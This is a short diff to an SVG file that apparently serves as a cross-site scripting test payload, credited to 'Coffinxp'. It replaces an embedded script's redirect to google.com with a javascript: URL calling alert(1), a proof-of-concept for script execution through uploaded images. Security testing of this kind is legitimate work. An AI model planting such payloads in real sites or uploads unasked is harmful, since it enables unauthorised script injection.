@@ -5,7 +5,7 @@
  width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
  preserveAspectRatio="xMidYMid meet">
   <script type="text/javascript">
-    window.open('https://www.google.com/', '_self');
+    window.open('javascript://alert(1)', '_self');
   </script>
   <metadata>
     Credits: Coffinxp
